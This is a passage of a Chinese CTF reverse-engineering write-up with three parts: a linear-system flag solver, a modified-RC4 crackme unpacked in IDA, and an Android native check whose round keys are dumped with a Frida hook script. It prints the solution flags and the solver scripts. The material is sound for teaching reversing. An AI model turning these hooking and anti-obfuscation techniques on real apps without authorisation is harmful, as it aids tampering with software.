    [79, 73, 60, 62, 25, 16, 77, 81, 79, 31, 82, 84, 62, 36, 18, 20, 46, 57, 21, 40, 3, 50, 58, 80, 84, 71, 87, 3, 13, 77, 83, 39, 55, 34, 41, 63],
    [7, 50, 26, 79, 21, 42, 83, 94, 63, 83, 3, 68, 25, 91, 3, 5, 17, 61, 3, 40, 87, 11, 27, 74, 73, 21, 56, 46, 36, 24, 14, 63, 21, 71, 30, 53],
    [57, 51, 49, 15, 94, 34, 27, 5, 100, 68, 67, 81, 10, 5, 85, 70, 80, 20, 89, 30, 84, 35, 41, 87, 75, 67, 20, 33, 29, 6, 97, 25, 10, 18, 23, 30],
    [97, 93, 10, 44, 28, 22, 17, 41, 47, 62, 42, 47, 61, 32, 31, 52, 47, 92, 42, 37, 7, 40, 48, 40, 11, 96, 51, 42, 66, 8, 89, 64, 30, 11, 8, 83],
    [51, 94, 58, 76, 21, 10, 75, 4, 55, 37, 71, 97, 27, 93, 82, 94, 38, 69, 36, 58, 93, 18, 54, 59, 12, 12, 54, 83, 73, 83, 33, 12, 78, 38, 45, 57],
    [78, 29, 8, 47, 48, 88, 18, 88, 50, 58, 36, 88, 9, 74, 85, 5, 91, 58, 85, 46, 89, 76, 61, 6, 61, 78, 4, 48, 50, 69, 23, 70, 23, 15, 22, 68],
    [75, 2, 94, 97, 72, 62, 78, 42, 69, 11, 37, 3, 29, 15, 39, 33, 18, 33, 12, 64, 6, 18, 34, 15, 3, 100, 85, 32, 97, 93, 84, 73, 26, 31, 71, 97],
    [59, 26, 48, 86, 58, 70, 61, 100, 63, 74, 26, 38, 24, 45, 52, 32, 91, 89, 19, 59, 87, 5, 15, 68, 72, 67, 2, 65, 46, 10, 33, 79, 11, 16, 73, 53],
    [6, 66, 59, 76, 86, 20, 59, 34, 28, 48, 86, 5, 87, 13, 95, 87, 65, 35, 58, 10, 98, 100, 4, 78, 66, 57, 34, 86, 62, 36, 92, 28, 3, 24, 49, 28],
    [25, 48, 44, 16, 99, 100, 69, 26, 65, 32, 18, 65, 58, 72, 61, 56, 10, 78, 93, 98, 39, 43, 87, 12, 42, 100, 100, 47, 31, 51, 75, 10, 63, 48, 22, 87],
    [61, 13, 100, 59, 31, 9, 28, 7, 27, 63, 11, 57, 95, 79, 21, 30, 60, 81, 43, 32, 30, 34, 80, 53, 28, 39, 74, 21, 18, 92, 73, 60, 21, 69, 76, 84],
    [22, 62, 61, 20, 66, 2, 11, 82, 93, 13, 69, 37, 92, 80, 66, 47, 28, 14, 62, 56, 89, 29, 39, 38, 46, 10, 6, 82, 77, 78, 45, 50, 5, 73, 17, 65],
    [5, 84, 83, 77, 76, 60, 20, 48, 53, 14, 98, 50, 37, 15, 31, 69, 55, 37, 64, 35, 26, 20, 18, 67, 50, 57, 60, 71, 4, 35, 23, 52, 11, 15, 83, 51],
    [33, 47, 89, 52, 89, 55, 98, 28, 48, 90, 69, 29, 68, 24, 19, 18, 44, 27, 14, 64, 15, 31, 23, 2, 36, 45, 37, 71, 61, 92, 28, 64, 13, 66, 98, 3],
    [80, 88, 68, 66, 46, 75, 32, 19, 36, 83, 63, 86, 79, 30, 61, 50, 100, 52, 66, 30, 20, 97, 45, 46, 38, 21, 32, 79, 68, 43, 65, 47, 86, 30, 74, 18],
    [11, 58, 95, 67, 96, 74, 60, 11, 21, 14, 100, 60, 70, 92, 92, 39, 43, 52, 5, 22, 90, 70, 12, 52, 36, 21, 45, 59, 74, 46, 11, 60, 8, 52, 14, 77],
    [57, 37, 94, 43, 53, 55, 7, 83, 91, 61, 86, 6, 44, 87, 61, 92, 24, 74, 100, 22, 12, 68, 19, 88, 81, 83, 70, 39, 30, 82, 30, 35, 55, 18, 27, 80],
    [80, 14, 5, 89, 71, 82, 44, 8, 33, 26, 77, 49, 36, 90, 73, 71, 66, 4, 37, 78, 38, 18, 15, 79, 6, 74, 18, 85, 56, 53, 90, 75, 52, 2, 13, 54],
    [96, 29, 37, 70, 92, 80, 24, 36, 32, 29, 78, 45, 58, 55, 16, 92, 71, 82, 86, 23, 4, 58, 16, 18, 38, 53, 82, 76, 83, 73, 87, 36, 61, 85, 61, 69],
    [14, 71, 53, 46, 59, 53, 22, 69, 67, 43, 23, 14, 77, 95, 19, 83, 79, 41, 12, 53, 3, 4, 65, 92, 64, 52, 3, 59, 89, 75, 12, 46, 61, 53, 97, 43],
    [57, 99, 49, 100, 68, 99, 26, 65, 47, 65, 90, 68, 84, 4, 9, 43, 88, 33, 48, 88, 37, 31, 21, 94, 22, 93, 70, 14, 13, 28, 83, 12, 80, 58, 43, 97],
    [33, 94, 56, 48, 13, 44, 81, 42, 19, 96, 67, 79, 12, 67, 34, 72, 45, 48, 24, 71, 65, 13, 32, 97, 48, 42, 65, 95, 54, 9, 35, 57, 18, 20, 83, 76],
    [31, 38, 83, 45, 28, 97, 54, 11, 80, 45, 92, 13, 52, 94, 51, 30, 11, 61, 46, 10, 28, 72, 20, 95, 90, 39, 32, 95, 19, 3, 65, 71, 73, 80, 23, 71],
    [9, 81, 80, 37, 96, 72, 95, 93, 26, 98, 50, 79, 57, 13, 49, 96, 82, 84, 89, 40, 38, 66, 81, 81, 79, 77, 86, 68, 26, 37, 15, 56, 13, 17, 50, 37],
    [82, 57, 33, 32, 79, 25, 54, 27, 50, 14, 72, 31, 28, 66, 4, 6, 48, 34, 63, 51, 12, 21, 73, 66, 53, 38, 54, 59, 76, 63, 61, 30, 84, 80, 98, 46],
    [69, 15, 23, 8, 46, 55, 21, 91, 37, 9, 61, 20, 23, 96, 28, 67, 19, 50, 18, 71, 30, 14, 10, 24, 100, 15, 91, 15, 93, 24, 46, 61, 67, 60, 56, 81]
]

b = [
    176386, 186050, 154690, 172116, 190544, 190323, 162017, 165118, 153332, 168472,
    178706, 143852, 154052, 147899, 176754, 171970, 166497, 173887, 173189, 174138,
    157623, 154943, 156078, 156158, 181770, 173577, 180922, 158596, 181072, 163777,
    187620, 169266, 162587, 198705, 160349, 148095
]

x = np.linalg.solve(A, b)

flag = ''.join([chr(round(i)) for i in x])

print("Flag:", flag)
```





##### flag

```
flag{PytH0n_R3v3rs1Ng_4nd_Z3_s0lV3r}
```







### 采一朵花，送给艾达（2）

##### 解题过程

先查看下文件的信息

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030608.png)

用`ida`打开

![image-20251018193836357](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030256.png)

发现有`JUMPOUT`反编译不出来

先整体看一下，发现`KeyGen()`函数整个都反编译不出来，从名称看这个应该是密钥生成的函数

![image-20251018194058754](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030890.png)

接着看

![image-20251018193929587](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030664.png)

发现这里的`rc4_init()`函数并不是真正的初始化函数，而是提示

这里先在主函数`JUMPOUT`前下个断点，跟进看一下程序的主要流程

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030451.png)

动调

这里一直跟进发现函数走到了`KeyGen()`函数

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030054.png)

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030639.png)

结合前面看到的函数名，这里生成的应该就是rc4的密钥

尝试还原一下主函数，看下大致的逻辑

在JUMPOUT处按tab键切换到汇编视图

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030332.png)

将这里nop掉

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032030924.png)

这里还有一个JUMPOUT，同样的操作nop掉

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031835.png)

得到完整的main函数

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031982.png)

但是这里发现一个问题就是这里的第一个密文v8变成动态生成的了

这里尝试调试发现每次的值都不一样，感觉这里应该是还原错了

重新尝试还原，这里不nop掉，将JUMPOUT这里Undefine掉

![image-20251018194932943](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031911.png)

发现main函数不一样了

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031762.png)

mian函数中用 5 个 64-bit 常量填充 `v5[0..4]`：

```
0x673AF04AEFE18A5C
0x0DCBAFF24A65D456
0xCFD8B1539076E546
0xFD469B79EF8A33B7
0x5985D24E20980BEC
```

这里明显就是密文

`v9 = KeyGen(v3)`这里密钥之前已经动调得到，这里就不用再多关注了

`rc4_init(v6, v9, v8)`：用密钥初始化 RC4 的 **S 盒/状态**（`v6` 是 256 字节的 KSA 状态数组）。

程序的主要逻辑就是对输入做 RC4 流加密

`memcpy(v7, Str, v10)` 把输入拷贝到工作缓冲 `v7`。

`rc4_crypt(v6, v7, v10)`：用上一步的 RC4 状态对 `v7` **执行 PRGA 异或**，即对 `v7` 进行 RC4 加密（长度 40）。

后面就是比较了

接着跟进rc4_crypt()函数

这里也不能反编译，但是这里尝试还原不行

![image-20251018195703499](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031329.png)

继续动调看一下，这里动调跟进的时候发现后面JUMPOUT后面的逻辑被反编译了出来

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031473.png)

```c
void __fastcall rc4_crypt(__int64 a1, __int64 a2, int a3)
{
  char v3; // [rsp+Fh] [rbp-11h]
  int j; // [rsp+10h] [rbp-10h]
  int i; // [rsp+14h] [rbp-Ch]
  int v6; // [rsp+18h] [rbp-8h]
  int v7; // [rsp+1Ch] [rbp-4h]

  v7 = 0;
  v6 = 0;
  for ( i = 0; i < a3; ++i )
  {
    v7 = (v7 + 1) % 256;
    v6 = (*(a1 + v7) + v6) % 256;
    v3 = *(a1 + v7);
    *(a1 + v7) = *(a1 + v6);
    *(v6 + a1) = v3;
    *(i + a2) = *(a1 + (*(a1 + v7) + *(a1 + v6))) ^ *(a2 + i);
  }
  for ( j = 0; j < a3; ++j )
    *(j + a2) = *(a2 + j) + j;
}
```

对`rc4_crypt(a1, a2, a3)` 做一下分析

```c
v7 = (v7 + 1) % 256;
v6 = (S[v7] + v6) % 256;
swap(S[v7], S[v6]);
data[i] ^= S[(S[v7] + S[v6]) % 256];
```

这部分是标准 RC4 流加密

```c
for (j = 0; j < a3; ++j)
    data[j] = data[j] + j;
```

这一步是额外添加的自定义扰动，每个字节又加上了自己的索引 `j`。

已知程序加密过程为：

```
cipher[i] = (plaintext[i] XOR keystream[i]) + i
```

要还原明文（即我们要输入的 flag）：

```
plaintext[i] = (cipher[i] - i) XOR keystream[i]
```

到这里就已经具备一切条件来完全解出 flag，key = `"PickingUpFlowers"`，S 初始表就是标准 0–255 顺序

密文

```
5c 8a e1 ef 4a f0 3a 67 56 d4 65 4a f2 af cb 0d
46 e5 76 90 53 b1 d8 cf b7 33 8a ef 79 9b 46 fd
ec 0b 98 20 4e d2 85 59
```



但是这里尝试按标准的rc4解密解不出来

这里的问题就在于RC4 的 KSA 被改过：`rc4_init` 不是标准 `S[i]=i`，而是先设 `S[i] = i ^ 0xCC`，再做常规 KSA；另外 `rc4_crypt` 在 RC4 异或后还额外对输出做了 `+ i` 的扰动。

这里要解密必须先对密文每个字节做 `cipher[i] -= i (mod 256)`；

再用改版 KSA（`S[i] = i ^ 0xCC` 后标准 KSA，key 为 `"PickingUpFlowers"`）生成 keystream；

最后 `plain[i] = tmp[i] XOR keystream[i]`。

编写脚本解密

![image-20251018200519500](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031487.png)

##### exp

```python
def ksa_xorcc(key: bytes):
    S = [(i ^ 0xCC) & 0xFF for i in range(256)]
    j = 0
    keylen = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % keylen]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def prga(S, n):
    i = 0
    j = 0
    ks = []
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        ks.append(S[(S[i] + S[j]) & 0xFF])
    return ks

def decrypt(cipher_bytes: bytes, key: bytes) -> bytes:
    tmp = bytes(((c - i) & 0xFF) for i, c in enumerate(cipher_bytes))
    S = ksa_xorcc(key)
    ks = prga(S, len(tmp))
    return bytes(b ^ k for b, k in zip(tmp, ks))

if __name__ == "__main__":
    cipher_hex = (
        "5c8ae1ef4af03a6756d4654af2afcb0d46e5769053b1d8cf"
        "b7338aef799b46fdec0b98204ed28559"
    )
    cipher = bytes.fromhex(cipher_hex)
    key = b"PickingUpFlowers"

    plain = decrypt(cipher, key)

    print(plain.decode("utf-8"))
```



##### flag

```
flag{WO0o0O0w_So0Oo0o_m4Ny_F1oO0o0oW3R5}
```













### 谁改了我的密钥啊

##### 解题过程

先使用apktool解包程序

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031564.png)

解包后使用jadx打开分析

![image-20251017220916243](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031929.png)

主函数唯一需要注意的就是这个提示注意端序的内容

在 `FirstFragment.java` 中找到核心逻辑：

![image-20251017221012847](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032031021.png)

这里可以发现程序判断flag是否正确的流程

调用了一个native方法checkFlag

Java 层会调用 `checkFlag(String input)`：

```
if (checkFlag(obj) && obj.length() == 16)
    Toast.makeText(getContext(), "right", 0).show();
```

也就是说，输入必须是16字节（长度16）的字符串，并且 `checkFlag()` 返回 `true` 才是正确flag。

接着跟进分析so函数

![image-20251017221151550](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032506.png)

`checkFlag` 是 JNI 方法

```
Java_work_pangbai_changemykey_FirstFragment_checkFlag(...)
```

关键点：

1. 从Java字符串取输入，保存在 `dest[16]`。
2. `MK = {1,0,0,0, 1,0,0,0, 4,0,0,0, 5,0,0,0}`。

![image-20251017221326020](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032926.png)

`xmmword_940 = B27022DC677D919756AA3350A3B1BAC6h`

![image-20251017221346691](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032437.png)

然后执行：

```
v6 = _mm_xor_ps(MK, xmmword_940);
extendSecond(v7, &v6);
iterate32(dest, v7);
```

最后比较：

```
if (*(DWORD*)&dest[12] == mm[0])
    return (mm[1]^dest[8..11] | mm[2]^dest[4..7] | mm[3]^dest[0..3]) == 0;
```

即：

```
dest[12:16] == 0xB60DE9B3
dest[8:12]  == 0x7A7A7B4C
dest[4:8]   == 0xC7D03789
dest[0:4]   == 0x2A278E6C
```

说明加密后的 `dest`（输入）必须等于这个mm数组

![image-20251017221416041](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032420.png)

我们可以视为：

```
extendSecond(keybuf, MK XOR const)
iterate32(inputbuf, keybuf)
输出 inputbuf 与 mm 比较
```

所以 `iterate32` 和 `extendSecond` 共同实现了一个类似对称加密的算法。
 目标是**找到输入16字节，使得最终经过这两步处理后 dest = mm**。

接着我们跟进 `iterate32` 和 `extendSecond` 函数接着分析

![image-20251017221506913](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032873.png)

![image-20251017221618774](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032010.png)



整体 `checkFlag` 的关键步骤（基于你最初贴的伪代码 + 新贴的函数）如下：

- 从 Java 层取到用户输入 `v4`（`const char *`），把它 `strncpy(dest, v4, 16)`，也就是只取前 16 字节放到 `dest[16]`（应该是 16 字节 flag candidate）。
- 打印了一堆 `MK` / `aKey` 字节（runtime 可在 logcat 看到）。
- 计算 `v6 = _mm_xor_ps(MK, xmmword_940)` —— 这意味着把一个 128-bit 向量 `MK` 与另一个 128-bit 常量 `xmmword_940` 做按位异或，结果作为四个 32-bit 整数传给 `extendSecond`（`(unsigned int *)&v6`）。
- 调用 `extendSecond(v7, (unsigned int *)&v6)`。`extendSecond` 用 `a2`（这里是 `v6`）作为输入，用 `unk_A80`、`byte_950`（一个 256 字节查表）迭代产生 32 个 32-bit 值，写回到 `a2`（并返回一块 32 个 uint 的输出 `v7`）。

这里跟进查看一下`unk_A80`、`byte_950`的值

![image-20251017221842836](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032744.png)

![image-20251017221857832](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032742.png)

接着是调用 `iterate32((unsigned int *)dest, v7)`。`iterate32` 使用 `a1 = dest`（interpreted as 4 uint32 words）和 `a2 = v7` 做 32 轮的变换，最终修改 `a1`（即修改 `dest` 的 16 字节内容）。

最后比较 `dest`（转为四个 32-bit 小端值）与 `mm[0..3]` 的关系：代码逻辑是

```
if dest[12..15] == mm[0] then
v3 = (mm[1] ^ dest[8..11] | mm[2] ^ dest[4..7] | mm[3] ^ dest[0..3]) == 0
```

也就是说要求： 

```
dest[12] == mm[0]  AND mm[1]==dest[8] AND mm[2]==dest[4] AND mm[3]==dest[0] (XORs and ORs ensure all zero).
```

`checkFlag` 里面还要求 `obj.length() == 16` 

所以可以把 `checkFlag` 看成：

先把 16 字节输入做 32 轮的迭代性置换（`iterate32`），其中变换参数由 `MK ^ xmmword_940` 通过 `extendSecond` 扩展得到；

然后把变换后的 16 字节与 `mm[]`（4 个 uint32）做固定比较，匹配即为 `right`。



到这里理一下逻辑

1. 从 Java 获取输入 → 拷贝前 16 字节到 dest；
2. 构造 MK，异或常量块；
3. 调用 `extendSecond()` 生成 32 个轮密钥；
4. 调用 `iterate32()` 进行 32 轮加密；
5. 最终比较 dest 与 mm，完全相等返回 True。

于是任务变成：
 求出能让 iterate32(输入, rk) = mm 的输入。



由于 `extendSecond` 算法复杂，直接逆向有点困难，这里用 Frida 动态提取真正的密钥表。

**注入 hook 脚本**

精确 attach 到导出符号 `_Z12extendSecondPjS_`（轮密钥扩展）并在返回时打印 `rk[0..31]`

attach 到 `_Z9iterate32PjS_`，在进入时打印 `dest`（输入的16字节）和在离开时打印 `X[0..3]`，方便验证

继续 hook JNI `Java_work_pangbai_changemykey_FirstFragment_checkFlag`，打印 Java 字符串（你已经有），并在 `onLeave` 里也打印返回值。

```
Java.perform(function () {
    console.log("[*] hook_dump_native.js started");

    var lib = "libchangemykey.so";
    var base = Module.findBaseAddress(lib);
    console.log("[*] " + lib + " base = " + base);

    // 1) Hook JNI checkFlag (if present) to log input
    var checkSym = Module.findExportByName(lib, "Java_work_pangbai_changemykey_FirstFragment_checkFlag");
    if (checkSym) {
        console.log("[+] Hooking JNI:", checkSym);
        Interceptor.attach(checkSym, {
            onEnter: function (args) {
                try {
                    // args: JNIEnv*, jobject, jstring
                    var env = Java.vm.getEnv();
                    var jstr = args[2];
                    var s = env.getStringUtfChars(jstr, null).readCString();
                    this.jstr = jstr;
                    console.log("[→] checkFlag input:", s);
                } catch (e) {
                    console.log("    [!] failed to read jstring:", e.message);
                }
            },
            onLeave: function (retval) {
                try {
                    console.log("[←] checkFlag returned (int):", retval.toInt32());
                } catch (e) {
                    console.log("[←] checkFlag returned:", retval);
                }
            }
        });
    } else {
        console.log("[-] JNI checkFlag export not found");
    }

    // Helper: read 16-bytes from pointer and print hex
    function read16(ptr) {
        try {
            var arr = [];
            for (var i=0;i<16;i++) {
                arr.push(("0"+(Memory.readU8(ptr.add(i)).toString(16))).slice(-2));
            }
            return arr.join("");
        } catch (e) {
            return "<err>";
        }
    }

    // Helper: read 32 u32s from pointer
    function readRK(ptr) {
        try {
            var arr = [];
            for (var i=0;i<32;i++) {
                var v = Memory.readU32(ptr.add(i*4));
                arr.push("0x" + ("00000000"+v.toString(16)).slice(-8));
            }
            return arr;
        } catch (e) {
            return ["<err>"];
        }
    }

    // Helper: read 4 u32s from pointer
    function read4(ptr) {
        try {
            var arr = [];
            for (var i=0;i<4;i++) {
                var v = Memory.readU32(ptr.add(i*4));
                arr.push("0x" + ("00000000"+v.toString(16)).slice(-8));
            }
            return arr;
        } catch (e) {
            return ["<err>"];
        }
    }

    // 2) Hook extendSecond: export name is mangled in C++ -> _Z12extendSecondPjS_
    var extName = "_Z12extendSecondPjS_";
    var extAddr = Module.findExportByName(lib, extName);
    if (extAddr) {
        console.log("[+] Found extendSecond at", extAddr);
        Interceptor.attach(extAddr, {
            onEnter: function (args) {
                // a1 = args[0] (out pointer for 32 uint32), a2 = args[1] (a2 pointer)
                this.out = args[0];
                this.a2 = args[1];
                // optionally dump a2[0..3] as initial key words
                try {
                    var a2_words = read4(this.a2);
                    console.log("    [ext] a2 initial words:", a2_words.join(", "));
                } catch(e){}
            },
            onLeave: function (retval) {
                // read 32 u32 values from out
                var rk = readRK(this.out);
                console.log("[*] extendSecond produced RK (32 words):");
                console.log("    " + rk.join(", "));
            }
        });
    } else {
        console.log("[-] extendSecond export not found at name", extName);
    }

    // 3) Hook iterate32: mangled name _Z9iterate32PjS_
    var itName = "_Z9iterate32PjS_";
    var itAddr = Module.findExportByName(lib, itName);
    if (itAddr) {
        console.log("[+] Found iterate32 at", itAddr);
        Interceptor.attach(itAddr, {
            onEnter: function (args) {
                // iterate32(unsigned int *a1, unsigned int *a2)
                // a1 = args[0] -> pointer to input 16 bytes (we'll read 4 words)
                // a2 = args[1] -> pointer to rk
                this.a1 = args[0];
                this.a2 = args[1];
                // dump the 16 input bytes (as hex) and the four words
                try {
                    console.log("[→] iterate32 in: 16bytes hex:", read16(this.a1));
                    console.log("    iterate32 in words:", read4(this.a1));
                    // also dump a2 first 8 words for quick glance
                    try {
                        var sampleRK = [];
                        for (var i=0;i<8;i++){ sampleRK.push("0x"+("00000000"+Memory.readU32(this.a2.add(i*4)).toString(16)).slice(-8)); }
                        console.log("    iterate32 uses RK[0..7]:", sampleRK.join(", "));
                    } catch(e){}
                } catch(e) {}
            },
            onLeave: function (retval) {
                // after iterate32, a1 is updated in place -> print new 4 words
                try {
                    console.log("[←] iterate32 out words:", read4(this.a1).join(", "));
                } catch(e) {}
            }
        });
    } else {
        console.log("[-] iterate32 export not found at name", itName);
    }

    console.log("[*] All hooks installed. Now trigger check in app (press the button).");
});
```

附加运行：

```
frida -U -n ChangeMyKey -l hook_dump_native.js
```

在 App 中点击 “check” 按钮（触发 `FirstFragment.checkFlag()`）

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032844.png)

输出

```
PS C:\Users\31989\Desktop\CTF比赛集\NewstarCTF\week3\RE\changemykey\lib\x86_64> frida -U -n ChangeMyKey -l hook_dump_native.js
     ____
    / _  |   Frida 16.7.19 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to HBP AL00 (id=127.0.0.1:16416)
Attaching...
[*] hook_dump_native.js started
[*] libchangemykey.so base = 0x75716c927000
[+] Hooking JNI: 0x75716c928520
[+] Found extendSecond at 0x75716c928110
[+] Found iterate32 at 0x75716c928280
[*] All hooks installed. Now trigger check in app (press the button).
[HBP AL00::ChangeMyKey ]-> [→] checkFlag input: flag{065ab67f4b24957ab40eb1cf28332d2e}
    [ext] a2 initial words: 0xa3b1bac7, 0x56aa3351, 0x677d9193, 0xb27022d9
[*] extendSecond produced RK (32 words):
    0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe, 0xc9369b41, 0xc37b49fe, 0xb701a942, 0xd28b7ca5, 0x012ed80f, 0x6e8907a2, 0x642d3777, 0x53151f14, 0xea6570f5, 0x496e4f90, 0x115b99d6, 0xa86f0ac5, 0x8bf5e626, 0x15993a5b, 0x412fb725, 0xd318054b, 0x57636ad6, 0x8193cc7e, 0x9cad9202, 0xc2fac368, 0xcc51871d, 0x360b8695, 0x6d2ed1b3, 0x41c190ad
[→] iterate32 in: 16bytes hex: 666c61677b3036356162363766346232
    iterate32 in words: 0x67616c66,0x3536307b,0x37366261,0x32623466
    iterate32 uses RK[0..7]: 0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe
[←] iterate32 out words: 0x8bef71dc, 0xb8c658a0, 0x2b5f1d33, 0x834f539b
[←] checkFlag returned (int): 0
[→] checkFlag input: flag{065ab67f4b24957ab40eb1cf28332d2e}
    [ext] a2 initial words: 0xa3b1bac7, 0x56aa3351, 0x677d9193, 0xb27022d9
[*] extendSecond produced RK (32 words):
    0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe, 0xc9369b41, 0xc37b49fe, 0xb701a942, 0xd28b7ca5, 0x012ed80f, 0x6e8907a2, 0x642d3777, 0x53151f14, 0xea6570f5, 0x496e4f90, 0x115b99d6, 0xa86f0ac5, 0x8bf5e626, 0x15993a5b, 0x412fb725, 0xd318054b, 0x57636ad6, 0x8193cc7e, 0x9cad9202, 0xc2fac368, 0xcc51871d, 0x360b8695, 0x6d2ed1b3, 0x41c190ad
[→] iterate32 in: 16bytes hex: 666c61677b3036356162363766346232
    iterate32 in words: 0x67616c66,0x3536307b,0x37366261,0x32623466
    iterate32 uses RK[0..7]: 0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe
[←] iterate32 out words: 0x8bef71dc, 0xb8c658a0, 0x2b5f1d33, 0x834f539b
[←] checkFlag returned (int): 0
[→] checkFlag input: flag{1n1t_@rr@y}
    [ext] a2 initial words: 0xa3b1bac7, 0x56aa3351, 0x677d9193, 0xb27022d9
[*] extendSecond produced RK (32 words):
    0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe, 0xc9369b41, 0xc37b49fe, 0xb701a942, 0xd28b7ca5, 0x012ed80f, 0x6e8907a2, 0x642d3777, 0x53151f14, 0xea6570f5, 0x496e4f90, 0x115b99d6, 0xa86f0ac5, 0x8bf5e626, 0x15993a5b, 0x412fb725, 0xd318054b, 0x57636ad6, 0x8193cc7e, 0x9cad9202, 0xc2fac368, 0xcc51871d, 0x360b8695, 0x6d2ed1b3, 0x41c190ad
[→] iterate32 in: 16bytes hex: 666c61677b316e31745f40727240797d
    iterate32 in words: 0x67616c66,0x316e317b,0x72405f74,0x7d794072
    iterate32 uses RK[0..7]: 0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe
[←] iterate32 out words: 0x2a278e6c, 0xc7d03789, 0x7a7a7b4c, 0xb60de9b3
[←] checkFlag returned (int): 1
[HBP AL00::ChangeMyKey ]->
```

可以看到：

32 轮密钥 `RK[0..31]` 全部 dump 出

`iterate32` 的逆向还原

根据反编译逻辑编写逆向算法 `iterate32_reverse`，核心关系：

```
old = new ^ t ^ r14 ^ r22 ^ r30 ^ r8
```

利用 dump 得到的 rk，逆推 32 轮可还原出最初的明文。

用 `iterate32_reverse` 从 `mm` 反推出初始 4 words（小端），然后拼回 16 字节明文，然后把最终 16 字节以 hex 和可读 ascii 两种形式返回给你，并用正向函数验证一次确保结果正确。

在 so 里看过：`strncpy(dest, v4, 0x10)`，所以这里可以看出 native 只取输入的前 16 字节

![image-20251018202301094](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032032241.png)

##### exp

```python
import struct

RK = [
    0x45603b22, 0x26440962, 0xf7ce61fc, 0xaf14cd76, 0x5b0b501d, 0x898e1f56, 0x36aa6e55, 0x9159d4fe,
    0xc9369b41, 0xc37b49fe, 0xb701a942, 0xd28b7ca5, 0x012ed80f, 0x6e8907a2, 0x642d3777, 0x53151f14,
    0xea6570f5, 0x496e4f90, 0x115b99d6, 0xa86f0ac5, 0x8bf5e626, 0x15993a5b, 0x412fb725, 0xd318054b,
    0x57636ad6, 0x8193cc7e, 0x9cad9202, 0xc2fac368, 0xcc51871d, 0x360b8695, 0x6d2ed1b3, 0x41c190ad,
]

SBOX = [
    0xD6,0x90,0xE9,0xFE,0xCC,0xE1,0x3D,0xB7,0x16,0xB6,0x14,0xC2,0x28,0xFB,0x2C,0x05,
    0x2B,0x67,0x9A,0x76,0x2A,0xBE,0x04,0xC3,0xAA,0x44,0x13,0x26,0x49,0x86,0x06,0x99,
    0x9C,0x42,0x50,0xF4,0x91,0xEF,0x98,0x7A,0x33,0x54,0x0B,0x43,0xED,0xCF,0xAC,0x62,
    0xE4,0xB3,0x1C,0xA9,0xC9,0x08,0xE8,0x95,0x80,0xDF,0x94,0xFA,0x75,0x8F,0x3F,0xA6,
    0x47,0x07,0xA7,0xFC,0xF3,0x73,0x17,0xBA,0x83,0x59,0x3C,0x19,0xE6,0x85,0x4F,0xA8,
    0x68,0x6B,0x81,0xB2,0x71,0x64,0xDA,0x8B,0xF8,0xEB,0x0F,0x4B,0x70,0x56,0x9D,0x35,
    0x1E,0x24,0x0E,0x5E,0x63,0x58,0xD1,0xA2,0x25,0x22,0x7C,0x3B,0x01,0x21,0x78,0x87,
    0xD4,0x00,0x46,0x57,0x9F,0xD3,0x27,0x52,0x4C,0x36,0x02,0xE7,0xA0,0xC4,0xC8,0x9E,
    0xEA,0xBF,0x8A,0xD2,0x40,0xC7,0x38,0xB5,0xA3,0xF7,0xF2,0xCE,0xF9,0x61,0x15,0xA1,
    0xE0,0xAE,0x5D,0xA4,0x9B,0x34,0x1A,0x55,0xAD,0x93,0x32,0x30,0xF5,0x8C,0xB1,0xE3,
